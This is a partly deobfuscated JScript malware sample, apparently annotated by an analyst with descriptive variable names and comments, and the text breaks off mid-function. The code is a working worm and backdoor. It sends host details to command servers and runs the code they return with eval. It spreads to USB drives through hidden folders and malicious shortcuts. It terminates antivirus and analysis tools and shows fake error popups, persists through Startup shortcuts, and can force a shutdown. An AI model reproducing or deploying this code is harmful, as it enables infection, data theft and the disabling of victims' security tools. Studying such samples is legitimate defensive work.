(function () {
	var weirdNumbers = {
		fourSevenTwo: "472",
		emptyString: "",
		zero: "0"
	};
	var wscriptShellAXO = new ActiveXObject("wscript.shell"),
		scriptingFileSystemObjectAXO = new ActiveXObject("scripting.filesystemobject"),
		create4RandomCharFunc = function () {
			return ((1 + Math["" + (53 > 43 ? "\x72" : "\x6a") + "ando" + "m"]()) * 65536 | 0)["" + (93 > 12 ? "\x74" : "\x6d") + "oStr" + "in" + (85 > 24 ? "\x67" : "\x5e") + ""](16)["" + "s" + (58 > 21 ? "\x75" : "\x6c") + "bstring"](1)
		},
		process = wscriptShellAXO["environment"]("process"),
		username = process("username"),
		computerName = process("computername"),
		shellApplicationAXO = new ActiveXObject("shell.application"),
		emptyArray1 = [],
		emptyArray2 = [],
		dod = "",
		dot = 0,
		changeAttributeOfFolderToHidden = function (sfJM) {
			try {
				var P4Nf = scriptingFileSystemObjectAXO["getFolder"](sfJM);
				P4Nf["attributes"] = 2
			} catch (vMVL) {}
		},
		encodeAString = function (sfJM) {
			sfJM += "";
			var P4Nf = 0;
			for (var vMVL = 0; vMVL < sfJM["length"]; vMVL++) P4Nf = (P4Nf << 5) - P4Nf + sfJM["charCodeAt"](vMVL), P4Nf &= P4Nf;
			return Math["abs"](P4Nf)
		},
		encodeComputerNameWithNumber = function (sfJM) {
			var P4Nf = "",
				vMVL = encodeAString(sfJM);
			for (var No_u = 0; No_u < encodeAString(sfJM) % 5 + 5; No_u++) vMVL = encodeAString(P4Nf + vMVL), P4Nf += String["f" + "romC" + (84 > 19 ? "\x68" : "\x63") + "arCode"](vMVL % 25 + 97);
			return P4Nf
		};
	var sendRequestToSearchEngineFunc = function () {
		var searchEngineURLs = ["http://www.microsoft.com/", "http://www.google.com/", "http://www.bing.com/"];
		for (var q$gq = 0, httpAXO, wep; q$gq < searchEngineURLs["" + "le" + (88 > 8 ? "\x6e" : "\x66") + "gth"]; q$gq++) {
			try {
				var httpAXO = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
				httpAXO["open"]("GET", searchEngineURLs[q$gq]);
				httpAXO["setRequestHeader"]("Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
				httpAXO["setRequestHeader"]("no-cache");
				httpAXO["setRequestHeader"]("no-cache");
				httpAXO["setRequestHeader"]("close");
				httpAXO["send"]("");
				wep = new Date(httpAXO["getAllResponseHeaders"]()["split"]("Date: ")["pop"]()["split"]("\n")["shift"]())["getTime"]() / 1000;
				if (1388534400 < wep) {
					return wep
				}
			} catch (sfJM) {}
		}
		return false;
	};
	var showOrHideInExplorerFunc = function (LJ4N) {
			try {
				wscriptShellAXO["run"]("%comspec% /c cacls \"" + LJ4N + "\" /T /E /G Users:F /C", 0, true)
			} catch (sfJM) {}
		},
		hr = function (sfJM) {
			if (sfJM) var P4Nf = 1,
				vMVL = 1;
			else var P4Nf = 2,
				vMVL = 0;
			try {
				wscriptShellAXO["regWrite"]("REG_DWORD")
			} catch (No_u) {}
			try {
				wscriptShellAXO["regWrite"]("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden", vMVL, "REG_DWORD")
			} catch (No_u) {}
		};
	var weirdStringManipulatorFunc = function (key, str) {
		var sr7L = [],
			IcYa = 0,
			fTuR, res = "";
		for (var q$gq = 0; q$gq < 256; q$gq++) {
			sr7L[q$gq] = q$gq;
		}
		for (q$gq = 0; q$gq < 256; q$gq++) {
			IcYa = (IcYa + sr7L[q$gq] + key["charCodeAt"](q$gq % key["length"])) % 256;
			fTuR = sr7L[q$gq];
			sr7L[q$gq] = sr7L[IcYa];
			sr7L[IcYa] = fTuR;
		}
		q$gq = 0;
		IcYa = 0;
		for (var jmmg = 0; jmmg < str["length"]; jmmg++) {
			q$gq = (q$gq + 1) % 256;
			IcYa = (IcYa + sr7L[q$gq]) % 256;
			fTuR = sr7L[q$gq];
			sr7L[q$gq] = sr7L[IcYa];
			sr7L[IcYa] = fTuR;
			res += String["fromCharCode"](str["charCodeAt"](jmmg) ^ sr7L[(sr7L[q$gq] + sr7L[IcYa]) % 256]);
		}
		return res;
	};
	var anotherRandom4CharGeneratorFunc = function () {
		return Math["floor"]((1 + Math["" + (98 > 18 ? "\x72" : "\x6a") + "ando" + "m"]()) * 0x10000).toString(16).substring(1)
	};
	var numberFlagMaybe = 1;
	var arrayOfApplications = ["regedit", "windows-kb", "mrt", "msconfig", "procexp", "avast", "avg", "mse", "ptinstall", "sdasetup", "issetup", "fs20", "mbam", "housecall", "hijackthis", "rubotted", "autoruns", "avenger", "filemon", "gmer", "hotfix", "klwk", "mbsa", "procmon", "regmon", "sysclean", "tcpview", "unlocker", "wireshark", "fiddler", "resmon", "perfmon", "msss", "cleaner", "otl", "roguekiller", "fss", "zoek", "emergencykit", "dds", "ccsetup", "vbsvbe", "combofix", "frst", "mcshield", "zphdiag"];
	var anotherWeirdStringManipulatingFunc = function (CM9L) {
		var No_u = [];
		var yaht = ""
		var sfJM = CM9L["length"];
		var index = 0;
		var KWjb;
		var letterCharacters = ["X", "S", "m", "j", "q", "r", "g", "U", "I", "J", "p", "N", "P", "H", "v", "h", "x", "u", "V", "l", "W", "z", "y", "k", "w", "Z", "n", "T", "o", "s", "R", "O", "Y", "L", "Q", "G", "i", "K", "t", "M"];
		while (index < sfJM) {
			KWjb = CM9L["charCodeAt"](index++)["toString"](16);
			while (KWjb["length"] < 2) KWjb = "0" + KWjb;
			No_u["push"](KWjb);
		}
		for (var q$gq = 0; q$gq < No_u["length"]; q$gq++) {
			if (Math["round"](Math["random"]() * 1)) yaht += randomNumberPickerFromArray(letterCharacters);
			yaht += No_u[q$gq];
			if (Math["round"](Math["random"]() * 1)) yaht += randomNumberPickerFromArray(letterCharacters);
		}
		return yaht;
	};
	var randomizeOrderOfElementInArrayFunc = function (H6qQ) {
		for (var IcYa, fTuR, q$gq = H6qQ["length"]; q$gq; IcYa = parseInt(Math["random"]() * q$gq), fTuR = H6qQ[--q$gq], H6qQ[q$gq] = H6qQ[IcYa], H6qQ[IcYa] = fTuR);
		return H6qQ;
	};
	var checkAFileIfExistQuitFunc = function () {
		if (scriptingFileSystemObjectAXO["fileExists"](malFolder + encodeComputerNameWithNumber(computerName + "09"))) WScript["quit"]()
	};
	var shutdownComputerWhenFileExistFunc = function () {
		try {
			var P4Nf = scriptingFileSystemObjectAXO["openTextFile"](malFolder + encodeComputerNameWithNumber(computerName + "00"), 8, !0);
			P4Nf["close"]();
			wscriptShellAXO["run"]("%comspec% /c shutdown /p /f", 0);
		} catch (sfJM) {}
	};
	var hm_Z = function () {
		var jPnB = [];
		for (var q$gq = new Enumerator(scriptingFileSystemObjectAXO["getFolder"](malFolder)["Files"]); !q$gq["atEnd"](); q$gq["moveNext"]()) {
			if (scriptingFileSystemObjectAXO["getExtensionName"](q$gq["item"]()["Name"]) == "exe") jPnB["push"](malFolder + q$gq["item"]()["Name"])
		}
		return jPnB
	};
	var gwrH = function (qckW) { //accepts integer
		for (var index = 0; index < emptyArray1["length"]; index++) {
			if (qckW) {
				try {
					emptyArray2[emptyArray1[index]] = scriptingFileSystemObjectAXO["openTextFile"](emptyArray1[index], 8, !0)
				} catch (sfJM) {}
			} else {
				try {
					emptyArray2[emptyArray1[index]]["close"]()
				} catch (sfJM) {}
			}
		}
	};
	var bFGe = function () {
		if (dod != "" && dot + (60 * 60 * 6 * 1000) >= new Date()["getTime"]()) {
			return dod
		} else {
			var someWeirdURLMaybeMalwareDropper = randomizeOrderOfElementInArrayFunc(["http://bellsyscdn.com/", "http:95.153.31.22", "http://urchintelemetry.com/", "http://95.153.31.18/"]);
			var u$2f = "";
			for (var zjbJ = 0; zjbJ < someWeirdURLMaybeMalwareDropper["length"]; zjbJ++) {
				try {
					$("asl", someWeirdURLMaybeMalwareDropper[zjbJ]);
					var ePhm = zxcvb;
					u$2f = someWeirdURLMaybeMalwareDropper[zjbJ]
				} catch (sfJM) {} finally {
					delete(zxcvb);
					delete(ePhm)
				}
				if (u$2f != "" ['replace']("6tIhf8QhTR", "")) break
			}
			if (u$2f == "" ['replace']("jzIloXMMSe", "")) {
				return false
			} else {
				dod = u$2f;
				dot = new Date()["g" + (82 > 1 ? "\x65" : "\x5e") + "tTi" + "" + (85 > 32 ? "\x6d" : "\x64") + "e"]();
				return dod
			}
		}
	};
	var $ = function (fab, fat) {
		var fileDropperPayloadMaybe = malFolder + encodeComputerNameWithNumber(computerName + "06");
		var smallLettersAndNumbers = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
		var phpSessionID = "";
		for (var No_u = 0; No_u < 26; No_u++) phpSessionID += smallLettersAndNumbers[Math["round"](Math["random"]() * 35)];
		var WHxs = anotherWeirdStringManipulatingFunc(weirdStringManipulatorFunc(phpSessionID, fab + ";v=" + weirdNumbers["fourSevenTwo"] + "&a=" + weirdNumbers["emptyString"] + "&t=" + weirdNumbers["zero"] + "&u=" + escape(username) + "&c=" + escape(computerName) + "&p=" + escape(CurrentVersionProductID) + "&i=" + escape(Ptez) + "&e=" + escape(languages["join"]("-")) + "&b=" + escape(windowsVersion["join"](".")) + "&s=" + escape(HVan)));
		var EUmY = fat === 1 ? bFGe() : fat;
		if (EUmY == false) throw Error();
		var http2AXO = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
		http2AXO["open"]("POST", EUmY);
		http2AXO["setRequestHeader"]("Cache-Control", "no-cache");
		http2AXO["setRequestHeader"]("application/x-www-form-urlencoded");
		http2AXO["setRequestHeader"]("Content-Length", WHxs["length"]);
		http2AXO["setRequestHeader"]("Cookie", "PHPSESSID=" + phpSessionID);
		http2AXO["setRequestHeader"]("User-Agent","Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
		http2AXO["setRequestHeader"]("Pragma", "no-cache");
		http2AXO["setRequestHeader"]("Connection", "close");
		http2AXO["setRequestHeader"](WHxs);
		var streamReaderAXO = new ActiveXObject("ADODB.Stream");
		streamReaderAXO["mode"] = 3;
		streamReaderAXO["type"] = 1;
		streamReaderAXO["open"]();
		streamReaderAXO["write"](http2AXO["responseBody"]);
		streamReaderAXO["saveToFile"](fileDropperPayloadMaybe, 2);
		var JsLl = scriptingFileSystemObjectAXO["openTextFile"](fileDropperPayloadMaybe, 1);
		var payloadFromDropper = JsLl["readAll"]();
		JsLl["close"]();
		try {
			scriptingFileSystemObjectAXO["deleteFile"](fileDropperPayloadMaybe)
		} catch (sfJM) {}
		for (var index = 0; index < payloadFromDropper["length"]; index++) {
			try {
				var nToF = parseInt(payloadFromDropper["substr"](index, 6), 36);
				var ls2z = parseInt(payloadFromDropper["substr"](index + 6, 6), 16);
				var yXud = parseInt(payloadFromDropper["substr"](index + 12, 7), 36);
				if (nToF + ls2z == yXud) {
					try {
						var lupQ = payloadFromDropper["substr"](index, 19);
						var VpGr = parseInt(payloadFromDropper["substr"](index + 19, 4), 36);
						var BBsF = payloadFromDropper["substr"](index + 23, VpGr);
						var Jxcb = "";
						for (var H6qQ = 0; H6qQ < BBsF["length"]; H6qQ += 2) Jxcb += String["fromCharCode"](parseInt(BBsF["substr"](H6qQ, 2), 16));
						var MKsP = weirdStringManipulatorFunc(lupQ, Jxcb);
						var nV5r = MKsP["substr"](0, 64);
						if (nV5r["substr"](0, 6) == "0QFQXx") {
							eval(MKsP["substr"](64, MKsP["length"] - 1));
							return
						}
					} catch (sfJM) {}
				}
			} catch (sfJM) {}
		}
	};
	var ZGwe = function () {
		var gGpu = 0;
		try {
			var SmcR = malFolder + encodeComputerNameWithNumber(computerName + "11");
			var P4Nf = scriptingFileSystemObjectAXO["openTextFile"](SmcR, 8, !0);
			P4Nf["close"]();
			showOrHideInExplorerFunc(SmcR);
			if (!gGpu) gwrH(0);
			gGpu++;
			shellApplicationAXO["shellExecute"](randomNumberPickerFromArray(x8zr), "\"" + WScript["ScriptFullName"] + "\" " + encodeComputerNameWithNumber(computerName + "10"), "", 0);
		} catch (sfJM) {}
		try {
			var SmcR = malFolder + encodeComputerNameWithNumber(computerName + "13");
			var P4Nf = scriptingFileSystemObjectAXO["openTextFile"](SmcR, 8, !0);
			P4Nf["close"]();
			showOrHideInExplorerFunc(SmcR);
			if (!gGpu) gwrH(0);
			gGpu++;
			shellApplicationAXO["shellExecute"](randomNumberPickerFromArray(x8zr), "\"" + WScript["ScriptFullName"] + "\" " + encodeComputerNameWithNumber(computerName + "12"), "", "", 0);
		} catch (sfJM) {}
		if (gGpu) {
			WScript["sleep"](1500);
			gwrH(1)
		}
	};
	var randomNumberPickerFromArray = function (nm2E) {
		return nm2E[Math["floor"](Math["random"]() * nm2E["length"])]
	};
	var CurrentVersionProductID = "000";
	try {
		CurrentVersionProductID = wscriptShellAXO["regRead"]("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductID")
	} catch (sfJM) {}
	var windowsVersion = [0, 0, 0, 0];
	try {
		for (var q$gq = new Enumerator(GetObject("winmgmts:root\cimv2")["ExecQuery"]("SELECT * FROM Win32_OperatingSystem")); !q$gq["atEnd"](); q$gq["moveNext"]()) {
			windowsVersion = q$gq["item"]()["version"]["split"](".");
			if (windowsVersion[0] >= 5) break
		}
	} catch (sfJM) {}
	if (!windowsVersion[0]) windowsVersion[0] = scriptingFileSystemObjectAXO["folderExists"](process("systemdrive") + "\\Users") ? 6 : 5;
	var languages = [""];
	try {
		var gFCm;
		for (var q$gq = new Enumerator(GetObject("winmgmts:root\cimv2")["ExecQuery"]("SELECT * FROM Win32_OperatingSystem")); !q$gq["atEnd"](); q$gq["moveNext"]()) {
			gFCm = ((gFCm = q$gq["item"]()["OSLanguage"]["toString"](16))["length"] == 4) ? gFCm : new Array(5 - gFCm["length"])["join"]("0") + gFCm;
			languages = wscriptShellAXO["regRead"]("HKLM\\SOFTWARE\\Classes\\MIME\\Database\\Rfc1766\\" + gFCm)["split"](";")[0]["split"]("-");
			break
		}
	} catch (sfJM) {}
	try {
		var x8zr = [];
		var malFolder = false;
		var userprofileDirectoryDotDot = scriptingFileSystemObjectAXO["getFolder"](process("userprofile") + "\\..\\");
		for (var q$gq = new Enumerator(userprofileDirectoryDotDot["SubFolders"]); !q$gq["atEnd"](); q$gq["moveNext"]()) {
			var malwareFolder = q$gq["item"]() + (windowsVersion[0] >= 6 ? "\\AppData\\Roaming\\" : "\\") + encodeComputerNameWithNumber(computerName + "02") + "\\";
			if (scriptingFileSystemObjectAXO["folderExists"](malwareFolder)) {
				try {
					var fileHandle = scriptingFileSystemObjectAXO["openTextFile"](malwareFolder + encodeComputerNameWithNumber(computerName + "05"), 8, !0);
					fileHandle["close"]();
					var MKsP = malwareFolder + encodeComputerNameWithNumber(computerName + "03"),
						jsScriptName = malwareFolder + encodeComputerNameWithNumber(computerName + "04") +".js";
					showOrHideInExplorerFunc(malwareFolder + "*");
					changeAttributeOfFolderToHidden(malwareFolder);
					malFolder = malwareFolder;
					try {
						scriptingFileSystemObjectAXO["copyFile"](WScript["scriptFullName"], jsScriptName, true)
					} catch (sfJM) {}
					try {
						var KC2f = malFolder + encodeComputerNameWithNumber(computerName + "00");
						var qnEe = scriptingFileSystemObjectAXO["openTextFile"](KC2f, 8, !0);
						showOrHideInExplorerFunc(KC2f);
						try {
							scriptingFileSystemObjectAXO["deleteFile"](malFolder + encodeComputerNameWithNumber(computerName + "09"))
						} catch (sfJM) {}
					} catch (sfJM) {
						if (WScript["Arguments"]["length"] > 0) {
							switch (WScript["Arguments"](0)) {
								case encodeComputerNameWithNumber(computerName + "10"):
									var malComputerName11 = malFolder + encodeComputerNameWithNumber(computerName + "11");
									try {
										var p9xC = scriptingFileSystemObjectAXO["openTextFile"](malComputerName11, 8, !0);
									} catch (sfJM) {
										WScript["quit"]()
									}
									showOrHideInExplorerFunc(malComputerName11);
									while (true) {
										try {
											var Ddrs = GetObject("winmgmts:root\cimv2");
											for (var listOfDrivesMaybe = new Enumerator(Ddrs["ExecQuery"]("SELECT * FROM Win32_DiskDrive")); !listOfDrivesMaybe["atEnd"](); listOfDrivesMaybe["moveNext"]()) {
												if (listOfDrivesMaybe["item"]()["Model"]["match"](/usb/i)) { //Check if drive is USB?
													var driveDeviceID = listOfDrivesMaybe["item"]()["DeviceID"];
													for (var partitions = new Enumerator(Ddrs["ExecQuery"]("ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" + driveDeviceID + "'} WHERE AssocClass=Win32_DiskDriveToDiskPartition")); !partitions["atEnd"](); partitions["moveNext"]()) {
														var okbG = partitions["item"]()["DeviceID"];
														for (var OvXq = new Enumerator(Ddrs["ExecQuery"]("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" + okbG + "'} WHERE AssocClass=Win32_LogicalDiskToPartition")); !OvXq["atEnd"](); OvXq["moveNext"]()) {
															var rootDrivePath = OvXq["item"]()["DeviceID"] + "\\",
																trr = "Drive\\",
																rootDriveSLASHDrivePath = rootDrivePath + trr, //Z:\Drive\
																numberPath = (encodeAString(computerName) % 500 + 405) + "\\",
																driveSLASHNumberPath = trr + numberPath, //.\Drive\512
																rootDriveSLASHDriveSLASHDriveSLASHNumberPath = rootDrivePath + driveSLASHNumberPath, //Z:\Drive\Drive\512
																numberSLASHJSPath = numberPath + encodeComputerNameWithNumber(computerName + "01") + ".js", //512\d3hJlK.js
																driveSLASHJSPath = driveSLASHNumberPath + encodeComputerNameWithNumber(computerName + "01") + ".js", //.\Drive\d3hJlK.js
																rootDriveSLASHDriveSLASHJSPath = rootDrivePath + driveSLASHJSPath, //Z:\Drive\d3hJlK.js
																rootDriveSLASHBatPath = rootDrivePath + "Drive.bat"; //Z:\Drive.bat
															try {
																var folderHandleToRootDriveSLASHDrivePath = scriptingFileSystemObjectAXO["getFolder"](rootDriveSLASHDrivePath);
																for (var subFoldersToRootDriveSLASHDrivePath = new Enumerator(folderHandleToRootDriveSLASHDrivePath["SubFolders"]); !subFoldersToRootDriveSLASHDrivePath["atEnd"](); subFoldersToRootDriveSLASHDrivePath["moveNext"]()) {
																	var N$wC = (subFoldersToRootDriveSLASHDrivePath["item"]() + "")["split"]("\\")["pop"]();
																	if (N$wC["length"] == 3 && !isNaN(parseFloat(N$wC)) && isFinite(N$wC)) {
																		var Z8os = scriptingFileSystemObjectAXO["getFolder"](rootDriveSLASHDrivePath + N$wC);
																		for (var mShs = new Enumerator(Z8os["Files"]); !mShs["atEnd"](); mShs["moveNext"]()) {
																			var UeuC = (mShs["item"]() + "")["split"]("\\")["pop"]();
																			if (scriptingFileSystemObjectAXO["getExtensionName"](UeuC)["toLowerCase"]() == "js") {
																				try {
																					scriptingFileSystemObjectAXO["copyFile"](WScript["scriptFullName"], rootDriveSLASHDrivePath + N$wC + "\\" + UeuC, true)
																				} catch (sfJM) {}
																			}
																		}
																	}
																}
															} catch (sfJM) {}
															if (scriptingFileSystemObjectAXO["fileExists"](malwareFolder + "0.gz") === false) {
																try {
																	scriptingFileSystemObjectAXO["createFolder"](rootDriveSLASHDrivePath)
																} catch (sfJM) {}
																try {
																	scriptingFileSystemObjectAXO["createFolder"](rootDriveSLASHDriveSLASHDriveSLASHNumberPath)
																} catch (sfJM) {}
																changeAttributeOfFolderToHidden(rootDriveSLASHDrivePath), changeAttributeOfFolderToHidden(rootDriveSLASHDriveSLASHDriveSLASHNumberPath);
																try {
																	var KuRU = scriptingFileSystemObjectAXO["openTextFile"](rootDriveSLASHBatPath, 2, 1);
																	KuRU["writeLine"]("cd Drive"), KuRU["writeLine"]("start ws^cript \"" + numberSLASHJSPath + "\""), KuRU["writeLine"]("exit"), KuRU["close"]()
																} catch (sfJM) {}
																var K3aB = [127, 128, 129];
																try {
																	var folderHandleToRootDriveSLASHDrivePath = scriptingFileSystemObjectAXO["getFolder"](rootDrivePath);
																	for (var subFoldersToRootDriveSLASHDrivePath = new Enumerator(folderHandleToRootDriveSLASHDrivePath["SubFolders"]); !subFoldersToRootDriveSLASHDrivePath["atEnd"](); subFoldersToRootDriveSLASHDrivePath["moveNext"]()) {
																		var N$wC = (subFoldersToRootDriveSLASHDrivePath["item"]() + "")["split"](":\\")["pop"]();
																		if (N$wC["substr"](0, 1) != "." && N$wC["substr"](0, 1) != "$" && N$wC["match"](/recycle/i) == null && N$wC["match"](/System Volume/) == null && N$wC["match"](/Drive/) == null) {
																			with(wscriptShellAXO["createShortcut"](rootDrivePath + N$wC + ".lnk")) targetPath = "cmd.exe", windowStyle = 7, arguments = "/c st^art Drive.bat & exp^lorer \"" + trr + N$wC + "\"", iconLocation = "%systemroot%\\system32\\shell32.dll," + randomNumberPickerFromArray(K3aB), save();
																			try {
																				var P4Nf = scriptingFileSystemObjectAXO["getFolder"](rootDrivePath + N$wC);
																				P4Nf["move"](rootDriveSLASHDrivePath + N$wC)
																			} catch (sfJM) {}
																			changeAttributeOfFolderToHidden(rootDriveSLASHDrivePath + N$wC)
																		}
																	}
																} catch (sfJM) {}
																try {
																	var folderHandleToRootDriveSLASHDrivePath = scriptingFileSystemObjectAXO["getFolder"](rootDrivePath);
																	for (var subFoldersToRootDriveSLASHDrivePath = new Enumerator(folderHandleToRootDriveSLASHDrivePath["Files"]); !subFoldersToRootDriveSLASHDrivePath["atEnd"](); subFoldersToRootDriveSLASHDrivePath["moveNext"]()) {
																		var N$wC = (subFoldersToRootDriveSLASHDrivePath["item"]() + "")["split"](":\\")["pop"]();
																		var vfRv = scriptingFileSystemObjectAXO["getExtensionName"](N$wC)["toLowerCase"]();
																		if (vfRv != "lnk" && vfRv != "bat" && vfRv != "" && vfRv != "js" && N$wC["toLowerCase"]() != "autorun.inf" && N$wC["substr"](0, 1) != "." && N$wC["substr"](0, 1) != "$" && N$wC["match"](/recycle/i) == null) {
																			var Zr4n = 0;
																			switch (vfRv) {
																				case "exe":
																					Zr4n = 261;
																					break;
																				case "doc":
																				case "docx":
																				case "qp+dRf" [(625311054 * "\x83pz'\x8asL@*|]=>[" ['charCodeAt'](3) + 27.0)['toString']((3 * "<\x8bf~+8T\x7f%d" ["length"] + 1.0))](/[\+qR]/g, ""):
																					Zr4n = 73;
																					break;
																				case "rtf":
																				case "txt":
																					Zr4n = 70;
																					break;
																				case "mp3":
																				case "m4a":
																				case "Woyg%ug" [(526566151 * "yB=Qzkp]&\x86N8" ['charCodeAt'](11) + 6.0)['toString']((2 * "HIV\x8b?pko]#\x821\x80*W" ["length"] + 2.0))](/[yW\%u]/g, ""):
																				case "y2wkarv" [("*b\x89E+Wf)Jco" ['charCodeAt'](3) * 290493135 + 59.0)['toString']((0 * "\x86p\x88bsd{vU%\x853" ['charCodeAt'](11) + 30.0))](/[rky2]/g, ""):
																				case "Ew+&mna" ['replace'](/[En\+\&]/g, ""):
																					Zr4n = 116;
																					break;
																				case "8+mSpP4" ['replace'](/[8SP\+]/g, ""):
																				case "Daq1vTi" [("/\x8b]4\x7f|x^{_\x80jNp<w6Qq\x84" ['charCodeAt'](14) * 840115113 + 29.0)['toString'](("xtPJyZng=*vN[" ["length"] * 2 + 9.0))](/[T1Dq]/g, ""):
																				case "1DwEeX_bsm" [(1636558871 * "\x8bDBLE.\x84|iQ" ["length"] + 9.0)['toString']((1.0 + "e\x85x/A(Z" ["length"] * 4))](/[D1\_EXs]/g, ""):
																				case "BfCyl`v" ['replace'](/[\`yBC]/g, ""):
																				case "Nmdo/v" ['replace'](/[d\/N]/g, ""):
																				case "Iwgmxv" ['replace'](/[Ixg]/g, ""):
																				case "V&mTZpseig" [(8401151134 * "rhH\x8b\x811" ["length"] + 5.0)['toString'](("AqW|<\x8aGL0\x87" ['charCodeAt'](4) * 0 + 35.0))](/[Z\&TsVi]/g, ""):
																				case "6mcpX5g" [(5.0 + "B\x86am\x89d" ["length"] * 5907990777)['toString']((0 * "\x80\x60\x7fnAYM%To;c[" ['charCodeAt'](5) + 33.0))](/[cX65]/g, ""):
																					Zr4n = 115;
																					break;
																				case "Ugqi7f" [(9943772186 * "|O\x80>&\x86" ["length"] + 2.0)['toString']((">\x86Nu;L\x60-C\x7f?]2=" ["length"] * 2 + 8.0))](/[qU7]/g, ""):
																				case "x1j9py/g" ['replace'](/[1\/9xy]/g, ""):
																				case "ljP0p6emg" [("q%T[\x842s^\x7f\x89" ["length"] * 1636558871 + 9.0)['toString']((7.0 + ")Q\x89KBY#}\x88Fc" ["length"] * 2))](/[mlP06]/g, ""):
																				case "3p0nd8g" [(44.0 + "\x7flM4Ox1\x873zs5" ['charCodeAt'](11) * 1125710058)['toString']((0 * "]\x86PCV}3\x8429[r>0xU<#" ['charCodeAt'](15) + 36.0))](/[30d8]/g, ""):
																					Zr4n = 302;
																					break;
																			}
																			with(wscriptShellAXO["createShortcut"](rootDrivePath + N$wC + ".lnk")) targetPath = "cmd.exe", windowStyle = 7, arguments = "/c st^art Drive.bat & \"" + trr + N$wC + "\"", iconLocation = "%systemroot%\\system32\\shell32.dll," + Zr4n, save();
																			try {
																				scriptingFileSystemObjectAXO["moveFile"](rootDrivePath + N$wC, rootDriveSLASHDrivePath + N$wC)
																			} catch (sfJM) {}
																			changeAttributeOfFolderToHidden(rootDriveSLASHDrivePath + N$wC)
																		}
																	}
																} catch (sfJM) {}
																try {
																	scriptingFileSystemObjectAXO["copyFile"](WScript["scriptFullName"], rootDriveSLASHDriveSLASHJSPath, true)
																} catch (sfJM) {}
															}
														}
													}
												}
											}
										} catch (sfJM) {}
										checkAFileIfExistQuitFunc();
										shutdownComputerWhenFileExistFunc();
										WScript["sleep"](14000)
									}
									break;
								case encodeComputerNameWithNumber(computerName + "12"):
									var malComputerName11 = malFolder + encodeComputerNameWithNumber(computerName + "13");
									try {
										var p9xC = scriptingFileSystemObjectAXO["openTextFile"](malComputerName11, 8, !0);
									} catch (sfJM) {
										WScript["qu" + (92 > 22 ? "\x69" : "\x62") + "" + "t"]()
									}
									showOrHideInExplorerFunc(malComputerName11);
									while (true) {
										try {
											var P4Nf = GetObject("winmgmts:root\cimv2");
											for (var q$gq = new Enumerator(P4Nf["ExecQuery"]("SELECT * FROM Win32_Process")); !q$gq["atEnd"](); q$gq["moveNext"]()) {
												var O2Ha = q$gq["item"]();
												if (O2Ha["name"]["match"](new RegExp(arrayOfApplications["join"]("|"), "i"))) {
													try {
														if (O2Ha["terminate"]() == 0 && O2Ha["ExecutablePath"] && !O2Ha["ExecutablePath"]["match"](/windows|program/i)) {
															var randomSixCharacter = ((0x2001 + Math["random"]()) * 30582 | 0)["toString"](16)["substring"](1);
															var tWAa = ((0x2001 + Math["random"]()) * 30582 | 0)["toString"](16)["substring"](1);
															wscriptShellAXO["popup"]("Application has generated an exception that could not be handled.\nProcess id=0x" + randomSixCharacter + " (" + parseInt(randomSixCharacter, 16) + "), Thread id=0x" + tWAa + " (" + parseInt(tWAa, 16) + ").\n\nClick OK to terminate the application.\nClick CANCEL to debug the application.", 8, O2Ha["name"] + " - Common Language Runtime Debugging Services", 4145);
														}
													} catch (sfJM) {}
												}
											}
										} catch (sfJM) {}
										checkAFileIfExistQuitFunc();
										shutdownComputerWhenFileExistFunc();
										WScript["sleep"](400)
									}
									break;
							}
						}
						if ((WScript["Arguments"]["length"] > 0 && WScript["Arguments"](0) == encodeComputerNameWithNumber(computerName + "07")) == false) WScript["quit"]()
					}
					if ((WScript["Arguments"]["length"] > 0 && WScript["Arguments"](0) == encodeComputerNameWithNumber(computerName + "07")) == false) {
						try {
							wscriptShellAXO["run"]("%comspec% /c del /F /S /Q \"" + malwareFolder + "*.exe\"", 0, true);
							WScript["sleep"](500)
						} catch (sfJM) {}
						ww = encodeComputerNameWithNumber(Math["random"]());
						mm = Math["ceil"](Math["random"]() * 5);
						if (mm > 3) ww += (mm > 4) ? "64" : "32";
						ww += ".exe";
						scriptingFileSystemObjectAXO["copyFile"](process("systemroot") + "\system32\wscript.exe", malwareFolder + ww, true);
						showOrHideInExplorerFunc(malwareFolder + ww);
						x8zr["push"](malwareFolder + ww)
					} else {
						x8zr = hm_Z()
					}
					var GKHf = x8zr[0];
					var HVan = 0;
					try {
						var startUpPath = process("systemdrive") + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
						var TSqw = startUpPath + "Start.lnk";
						with(wscriptShellAXO["createShortcut"](TSqw)) targetPath = "\"" + GKHf + "\"", windowStyle = 1, arguments = "\"" + bfi +"\"", iconLocation = "%systemroot%\\system32\\shell32.dll,3", save();
						showOrHideInExplorerFunc(TSqw);
						HVan++;
						emptyArray1["push"](TSqw);
						var BFoP = ["atajo.lnk"];
						for (var kD4m = 0; kD4m < BFoP["length"]; kD4m++) {
							try {
								scriptingFileSystemObjectAXO["deleteFile"](startUpPath + BFoP[kD4m])
							} catch (sfJM) {}
						}
					} catch (sfJM) {}
					try {
						var create4RandomCharFunc = scriptingFileSystemObjectAXO["getFolder"](process("userprofile") +"\\..\\");
						for (var IcYa = new Enumerator(create4RandomCharFunc["SubFolders"]); !IcYa["atEnd"](); IcYa["moveNext"]()) {
							var JsLl = IcYa["item"]();
							for (var q$gq = 0; q$gq < username["length"]; q$gq++) {
								try {
									var startUpPath = JsLl + (windowsVersion[0] >= 6 ? "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" :"\\Start Menu\\Programs\\Startup\\");
									var TSqw = startUpPath + "Start.lnk";
									with(wscriptShellAXO["createShortcut"](TSqw)) targetPath = "\"" + GKHf + "\"", windowStyle = 1, arguments = "\"" + bfi + "\"", iconLocation = "%systemroot%\\system32\\shell32.dll,3", save();
									showOrHideInExplorerFunc(TSqw);
									emptyArray1["push"](TSqw);
									var BFoP = ["atajo.lnk"];
